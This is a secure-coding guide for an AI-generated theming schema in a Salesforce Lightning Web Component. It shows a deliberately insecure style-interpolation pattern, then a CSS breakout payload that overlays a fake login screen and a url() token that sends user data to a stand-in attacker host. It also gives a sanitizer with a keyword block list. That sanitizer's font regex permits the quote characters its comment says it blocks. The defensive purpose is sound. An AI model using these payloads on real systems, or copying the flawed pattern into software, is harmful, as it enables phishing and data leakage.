This blueprint details how to implement an AI-driven styling and layout engine for your Salesforce Form Builder managed package.

To pass the AppExchange Security Review while allowing the AI to completely transform the visual presentation, you must decouple **Structure** from **Style**. Letting the AI generate raw, unvalidated HTML (`innerHTML`) is an automatic XSS security failure. Instead, your static LWC blocks will use **dynamic CSS Grid layouts** and **CSS Custom Properties (Styling Hooks)** orchestrated by an AI-generated configuration schema.

### 3. Dynamically Passing Styles to Child Blocks

In your `Main Page` JS controller, extract the theme configuration and transform it into an inline style block applied to the component's host container, injecting the custom variables natively:

```javascript
// mainPage.js
import { LightningElement, api, track } from "lwc";

export default class MainPage extends LightningElement {
  @api themeConfigJson; // Saved AI JSON config from database
  @track themeConfig = {};

  connectedCallback() {
    if (this.themeConfigJson) {
      this.themeConfig = JSON.parse(this.themeConfigJson);
    }
  }

  get containerClass() {
    const variant = this.themeConfig.layout?.variant || "single-page";
    const cardStyle = this.themeConfig.layout?.cardStyle || "flat";
    const sidePos = this.themeConfig.layout?.sidebarPosition || "left";

    return `layout-${variant} style-card-${cardStyle} position-${sidePos}`;
  }

  get globalStyles() {
    if (!this.themeConfig.theme) return "";
    const global = this.themeConfig.theme.global;
    // Map JSON properties straight to CSS variables passed down the shadow DOM
    return `
            --bg-color: ${global.backgroundColor || "#ffffff"};
            --radius: ${global.borderRadius || "4px"};
            font-family: ${global.fontFamily || "inherit"};
        `;
  }

  get isSplitOrSidebar() {
    const v = this.themeConfig.layout?.variant;
    return v === "split-page" || v === "sidebar";
  }
}
```

While avoiding `innerHTML` eliminates traditional Cross-Site Scripting (XSS), injecting raw strings into an inline `style` attribute introduces **CSS Injection** and **UI Redos/Phishing** vectors.

There are two primary ways an attacker (or a hallucinating/compromised LLM) can exploit the previous pattern, and here is exactly how to secure it.

---

## The Vulnerability Breakdown

### 1. The Semicolon Breakout (Inline Attribute Hijacking)

In the previous code, we used string interpolation inside a template literal to construct the inline `style` attribute. If the JSON payload returned:

```json
"backgroundColor": "red; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999; background: black; content: 'Please re-authenticate';"

```

The rendered HTML becomes:

```html
<div style="--bg-color: red; position: fixed; top: 0; left: 0; ..."></div>
```

The attacker has completely broken out of the custom variable definition and injected raw CSS properties onto the page, allowing them to overlay a fake login screen (phishing) or deface the Salesforce UI.

### 2. Malicious `url()` Tokens (Data Exfiltration & SSRF)

Even if you use custom properties properly, if a variable is used inside a shorthand CSS property (like `background: var(--bg-color)`), an attacker can pass a malicious image token:

```json
"backgroundColor": "url('https://attacker.com/log?user=compromised')"

```

When the browser renders the form, it will automatically make a silent outbound HTTP request to the attacker's server, leaking corporate IP addresses, user context, or triggering unauthenticated tracking.

---

## The Solution: Two-Layer Defense

To fully secure this for your managed package, you must replace template string interpolation with the native browser **`style.setProperty()` API** and implement a strict **Type Validation Utility**.

### Step 1: Write a Strict Sanitizer Utility

Create a reusable helper class in your LWC bundle (`formSanitizer.js`) that uses strict regular expressions to validate incoming AI tokens before they ever touch the DOM.

```javascript
// formSanitizer.js

// Allow standard hex, rgb, rgba, and safe CSS color keywords
const COLOR_REGEX =
  /^#([A-Fa-f0-9]{3,4}|[A-Fa-f0-9]{6}|[A-Fa-f0-9]{8})$|^rgba?\([^)]+\)$|^[a-zA-Z]+$/;

// Allow valid CSS dimensions (px, rem, em, %, vh, vw)
const DIMENSION_REGEX = /^\d+(\.\d+)?(px|rem|em|%|vh|vw)$/;

// Allow safe font families, blocking characters that break out of quotes
const FONT_REGEX = /^[a-zA-Z0-9\s?,'"-]+$/;

export function sanitizeStyleValue(value, type) {
  if (!value || typeof value !== "string") return "";

  // Defensive Line 1: Absolute ban on dangerous keywords
  const lowerValue = value.toLowerCase();
  if (
    lowerValue.includes("url") ||
    lowerValue.includes("expression") ||
    lowerValue.includes("javascript")
  ) {
    console.warn(
      `Security Warning: Blocked malicious CSS token injection attempt.`
    );
    return "";
  }

  // Defensive Line 2: Enforce strict type patterns
  switch (type) {
    case "color":
      return COLOR_REGEX.test(value.trim()) ? value.trim() : "";
    case "dimension":
      return DIMENSION_REGEX.test(value.trim()) ? value.trim() : "";
    case "font":
      return FONT_REGEX.test(value.trim()) ? value.trim() : "";
    default:
      return "";
  }
}
```

### Step 2: Refactor the LWC to use `style.setProperty()`

The `style.setProperty(name, value)` method is inherently safe against semicolon breakouts. The browser treats the second argument **strictly as a literal value** for that specific property name—it will not interpret semicolons as a delimiter to spawn new CSS rules.

Remove `style={globalStyles}` from your template HTML, add data-attributes, and apply the sanitized values via JavaScript during the lifecycle hooks:

```html
<!-- mainPage.html -->
<template>
  <!-- Keep the HTML clean of inline string interpolation -->
  <div class="{containerClass}" data-id="formContainer">
    <div class="form-wrapper">
      <c-form-header title="{formTitle}"></c-form-header>
      <main class="form-body">
        <!-- Pages render here -->
      </main>
    </div>
  </div>
</template>
```

```javascript
// mainPage.js
import { LightningElement, api, track } from "lwc";
import { sanitizeStyleValue } from "./formSanitizer";

export default class MainPage extends LightningElement {
  @api themeConfigJson;
  @track themeConfig = {};

  renderedCallback() {
    this.applyDynamicStyles();
  }

  applyDynamicStyles() {
    const container = this.template.querySelector('[data-id="formContainer"]');
    if (!container || !this.themeConfigJson) return;

    try {
      const config = JSON.parse(this.themeConfigJson);
      const global = config.theme?.global || {};

      // Sanitize each token individually
      const safeBgColor = sanitizeStyleValue(global.backgroundColor, "color");
      const safeRadius = sanitizeStyleValue(global.borderRadius, "dimension");
      const safeFont = sanitizeStyleValue(global.fontFamily, "font");

      // Apply natively via the property setter API (Semicolon safe)
      if (safeBgColor) container.style.setProperty("--bg-color", safeBgColor);
      if (safeRadius) container.style.setProperty("--radius", safeRadius);
      if (safeFont) container.style.setProperty("font-family", safeFont);
    } catch (error) {
      console.error(
        "Failed to safely parse or apply AI theme configuration",
        error
      );
    }
  }
}
```

### Step 3: Hard-code CSS Property Mappings

In your component CSS files, **never use shorthand properties** with dynamic tokens. Explicitly map your variables to long-form properties that reject images or layouts natively.

```css
/* mainPage.css */
.form-wrapper {
  /* SAFE: Even if an image URL bypassed the JS sanitizer, */
  /* background-color completely ignores url() values in the browser engine */
  background-color: var(--bg-color, #ffffff);
  border-radius: var(--radius, 4px);
}
```
